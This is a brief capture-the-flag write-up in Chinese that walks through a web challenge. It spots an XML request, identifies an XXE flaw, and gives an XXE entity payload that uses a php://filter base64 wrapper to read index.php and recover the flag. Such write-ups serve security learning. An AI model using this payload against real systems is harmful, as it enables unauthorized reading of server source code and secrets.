# 0x02 who*are*you?

![](../Images/65800c78df49e730a60f1a400072ccb8.png)

打开界面发现个输入框

![](../Images/73ff780123c0879290744c44f70e8e22.png)  

随便输入点东西，然后用开发者工具监控一下流量

![](../Images/6ddd3f2fdd0e94e3e76988345bc49b2c.png)  

一看就是XXE实体注入，构造语句

```
1.  `<?xml version="1.0" encoding="UTF-8"?>`
    
2.  `<!DOCTYPE feedback [`
    
3.  `<!ENTITY author SYSTEM "php://filter/convert.base64-encode/resource=index.php">`
    
4.  `]>`
    
5.  `<feedback><author>&author;</author></feedback>`
    
```

![](../Images/37487b29705b26066cfa9c2b301e920a.png) 

base64解码可得flag  

![](../Images/b69a3bb5f8c43f94a771e17ad1f14e84.png)
